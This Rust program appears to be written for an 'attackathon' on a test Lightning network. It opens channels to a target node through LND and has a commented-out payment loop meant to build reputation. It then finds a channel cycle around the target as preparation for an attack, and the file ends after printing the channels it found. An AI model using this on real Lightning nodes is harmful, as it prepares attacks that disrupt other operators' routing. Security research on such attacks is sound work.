use hashes::sha2::sha256;
use hex;
use rand;
use std::process::Command;
use std::time::Duration;
use tokio;
use tonic_lnd;
use tonic_lnd::Client;
use tonic_lnd::lnrpc::*;
use tonic_lnd::routerrpc::*;

async fn wait_for_sync(client: &mut Client) {
	let mut ok = false;
	while !ok {
		let info = client.lightning()
			.get_info(GetInfoRequest{})
			.await
			.expect("failed to get info")
			.into_inner();
		ok = info.synced_to_chain && info.synced_to_graph;
		if !ok {
			println!("Client {:#?} not synced, waiting...", info.identity_pubkey);
			sleep(1).await;
		}
	}
}

async fn setup_channel0(client0: &mut Client, target: Vec<u8>) -> bool {
	let channels = client0.lightning()
		.list_channels(ListChannelsRequest::default())
		.await
		.expect("failed to list channels");
	println!("listchannels: {:#?}", channels);
	if channels.into_inner().channels.len() > 0 {
		println!("Client 0 has channels, assuming we already opened!");
		return false;
	}

	wait_for_sync(client0)
		.await;

	let mut chan0target = OpenChannelRequest::default();
	chan0target.node_pubkey = target;
	chan0target.private = false;
	chan0target.local_funding_amount = 16777215;

	let result = client0.lightning()
		.open_channel_sync(chan0target)
		.await
		.expect("failed to open");
	println!("channel 0<->target: {:#?}", result);
	return true;
}
async fn setup_channel1(client1: &mut Client, target: Vec<u8>) -> bool {
	let channels = client1.lightning()
		.list_channels(ListChannelsRequest::default())
		.await
		.expect("failed to list channels");
	println!("listchannels: {:#?}", channels);
	if channels.into_inner().channels.len() > 0 {
		println!("Client 1 has channels, assuming we already opened!");
		return false;
	}

	wait_for_sync(client1)
		.await;

	/* NOTE: this is us "buying" a channel from the target
	 * node, e.g. JIT channel.  */
	let mut chan1target = OpenChannelRequest::default();
	chan1target.node_pubkey = target;
	chan1target.private = false;
	chan1target.local_funding_amount = 16777215;
	chan1target.push_sat = 16000000;

	let result = client1.lightning()
		.open_channel_sync(chan1target)
		.await
		.expect("failed to open");
	println!("channel 1<->target: {:#?}", result);
	return true;
}
fn mine_blocks() {
	let output = Command::new("bitcoin-cli")
		.arg("-generate")
		.arg("6")
		.output()
		.expect("Blocks mined");
	println!("Generate: {:#?}", output);
}
async fn setup_channels( client0: &mut Client
		       , client1: &mut Client
		       , target: Vec<u8>
		       ) {
	let opened0 = setup_channel0(client0, target.clone()).await;
	let opened1 = setup_channel1(client1, target.clone()).await;
	/* If either client opened, mine blocks.
	 * Otherwise, do nothing.
	 */
	if opened0 || opened1 {
		mine_blocks();
	}
}

/////////////////////////////////////////////////////////////////

async fn get_client_nodeid(client: &mut Client) -> Vec<u8> {
	let info = client.lightning()
		.get_info(GetInfoRequest{})
		.await
		.expect("failed to get info")
		.into_inner();
	hex::decode(info.identity_pubkey).expect("identity_pubkey must be hex???")
}
fn just_sha256(inp: &[u8]) -> [u8; 32] {
	let mut buf: [u8; 32] = [0; 32];
	buf.clone_from_slice(&sha256::hash(inp).into_bytes());
	buf
}
async fn keysend( source_client: &mut Client
		, dest_client: &mut Client
		, amt: i64
		) {
	const KEYSEND_KEY: u64 = 5482373484;

	let dest_nodeid = get_client_nodeid(dest_client)
		.await;
	let preimage: [u8; 32] = rand::random();
	let hash = just_sha256(&preimage);
	println!("keysend: preimage = {:#?}, hash = {:#?}", preimage, hash);

	let mut req = SendPaymentRequest::default();
	req.dest = dest_nodeid;
	req.dest_custom_records.insert(KEYSEND_KEY, preimage.to_vec());
	req.amt = amt;
	req.payment_hash = hash.to_vec();
	req.timeout_seconds = 10;
	req.fee_limit_msat = i64::max_value();

	let rsp = source_client.router()
		.send_payment_v2(req)
		.await
		.expect("failed to keysend!");
	let mut stream = rsp.into_inner();
	let result = stream.message()
		.await
		.expect("failed to peek message from keysend")
		.expect("no message from keysend");
	println!("keysend: {:#?}", result);
}

/////////////////////////////////////////////////////////////////
async fn sleep(secs: u64) {
	println!("Sleeping for {secs} seconds...");
	tokio::time::sleep(Duration::new(secs, 0))
		.await;
}
/////////////////////////////////////////////////////////////////

struct ChannelFinder {
	edges: Vec<ChannelEdge>
}
#[derive(Debug)]
struct FoundChannel {
	channel_id: u64,
	source: Vec<u8>,
	dest: Vec<u8>,
	policy: Option<RoutingPolicy>
}
impl ChannelFinder {
	async fn new(client: &mut Client) -> Self {
		let graph = client.lightning()
			.describe_graph(ChannelGraphRequest{
				include_unannounced: true
			})
			.await
			.expect("describegraph failed")
			.into_inner();
		let edges = graph.edges;
		Self{ edges }
	}
	fn search( &self
		 , source_nodeid: Option<&[u8]>
		 , dest_nodeid: Option<&[u8]>
		 , amt: i64
		 ) -> Option<FoundChannel> {
		let edges = &self.edges;
		for e in edges {
			if e.capacity != amt {
				continue;
			}
			let n1 = hex::decode(
				&e.node1_pub
			).expect("expected hex in node1_pub");
			let n2 = hex::decode(
				&e.node2_pub
			).expect("expected hex in node1_pub");
			match (source_nodeid, dest_nodeid) {
				(None, None) => panic!(),
				(Some(s), Some(d)) => {
					if n1 == s && n2 == d {
						return Some(FoundChannel{
							channel_id: e.channel_id,
							policy: e.node1_policy.clone(),
							source: n1.clone(),
							dest: n2.clone()
						});
					} else if n2 == s && n1 == d {
						return Some(FoundChannel{
							channel_id: e.channel_id,
							policy: e.node2_policy.clone(),
							source: n2.clone(),
							dest: n1.clone()
						});
					}
				},
				(Some(s), None) => {
					if n1 == s {
						return Some(FoundChannel{
							channel_id: e.channel_id,
							policy: e.node1_policy.clone(),
							source: n1.clone(),
							dest: n2.clone()
						});
					} else if n2 == s {
						return Some(FoundChannel{
							channel_id: e.channel_id,
							policy: e.node2_policy.clone(),
							source: n2.clone(),
							dest: n1.clone()
						});
					}
				},
				(None, Some(d)) => {
					if n2 == d {
						return Some(FoundChannel{
							channel_id: e.channel_id,
							policy: e.node1_policy.clone(),
							source: n1.clone(),
							dest: n2.clone()
						});
					} else if n1 == d {
						return Some(FoundChannel{
							channel_id: e.channel_id,
							policy: e.node2_policy.clone(),
							source: n2.clone(),
							dest: n1.clone()
						});
					}
				}
			}
		}
		return None;
	}
}

/////////////////////////////////////////////////////////////////
#[tokio::main]
async fn main() {
	let mut args = std::env::args_os();
	args.next().expect("arg0 absent???");

	let addr0 = args.next().expect("no addr0")
			.into_string().expect("addr0 not UTF-8");
	let cert0 = args.next().expect("no cert0");
	let macr0 = args.next().expect("no macr0");
	let addr1 = args.next().expect("no addr0")
			.into_string().expect("addr0 not UTF-8");
	let cert1 = args.next().expect("no cert0");
	let macr1 = args.next().expect("no macr0");

	let target = hex::decode(
		args.next().expect("no target")
			.into_string().expect("target must be UTF-8")
	).expect("target must be hex");

	/* Add https:// and :1009 */
	let addr0 = "https://".to_owned() + &addr0 + ":10009";
	let addr1 = "https://".to_owned() + &addr1 + ":10009";

	let mut client0 = tonic_lnd::connect(addr0, cert0, macr0)
		.await
		.expect("failed to connect to client 0");
	let mut client1 = tonic_lnd::connect(addr1, cert1, macr1)
		.await
		.expect("failed to connect to client 1");

	/* Step 0: set up channels from 0 -> target -> 1.  */
	setup_channels(&mut client0, &mut client1, target.clone())
		.await;

	/* Step 1: spend big funds from 0-> target -> 1 and back.  */
	/* Seed client1 with some funds first.  */
//	keysend( &mut client0
//	       , &mut client1
//	       , 1000000
//	       ).await;
//	sleep(10).await;
//	for _ in 0..100 {
//		/* Swap funds back and forth to build our reputation... */
//		keysend( &mut client0
//		       , &mut client1
//		       , 1000000
//		       ).await;
//		keysend( &mut client1
//		       , &mut client0
//		       , 1000000
//		       ).await;
//		sleep(10).await;
//	}

	/* Step 2: attack: route through a specific route:
	 *
	 * client0
	 *    |
	 *    |
	 * target ==bigchan=== 3
	 *    |                |
	 *  smallchan       medchan
	 *    |                |
	 *    +------- 5 ------+
	 *
	 * From client0, go to target, then through bigchan,
	 * medchan, and smallchan, then back to client0.
	 *
	 * The thesis is that such cycles are not uncommon,
	 * and in fact the sampled random walk ln_10 used
	 * in the attackathon does have such a cycle around
	 * target node (node 7): bigchan is from node 7 to
	 * node 3, medchan is from node 3 to node 5, and
	 * smallchan is from node 5 to 7.
	 * We kinda semi-hardcode this here, but in a "real"
	 * attack searching for such a cycle can be done as
	 * part of attack preparation.
	 */
	const BIGCHAN_AMT   : i64 = 100000000;
	const MEDCHAN_AMT   : i64 =   4000000;
	const SMALLCHAN_AMT : i64 =    400000;
	/* In the ln_10 graph, there are multiple channels
	 * that match MEDCHAN_AMT, but only one channel
	 * each match BIGCHAN_AMT and SMALLCHAN_AMT.
	 * Again, while we kinda hardcode the amounts and
	 * how we search for them, this kind of search can
	 * be done in more sophisticated attack code than
	 * I have time to code in one day.
	 */
	let finder = ChannelFinder::new(&mut client0).await;
	let bigchan = finder.search(
		Some(&target),
		None,
		BIGCHAN_AMT
	).expect("we know this channel exists in ln_10");
	let smallchan = finder.search(
		None,
		Some(&target),
		SMALLCHAN_AMT
	).expect("we know this channel exists in ln_10");
	/* Find midchan as the one between bigchan.dest and
	 * smallchan.source
	 */
	let medchan = finder.search(
		Some(&bigchan.dest),
		Some(&smallchan.source),
		MEDCHAN_AMT
	).expect("we know this channel exists in ln_10");

	/* Get firstchan and lastchan.  */
	let client0_nodeid = get_client_nodeid(&mut client0)
		.await;
	let firstchan = finder.search(
		Some(&client0_nodeid),
		Some(&target),
		16777215
	).expect("we made this channel");
	let lastchan = finder.search(
		Some(&target),
		Some(&client0_nodeid),
		16777215
	).expect("we made this channel");

	println!("firstchan = {:#?}", firstchan);
	println!("bigchan = {:#?}", bigchan);
	println!("medchan = {:#?}", medchan);
	println!("smallchan = {:#?}", smallchan);
	println!("lastchan = {:#?}", lastchan);
}
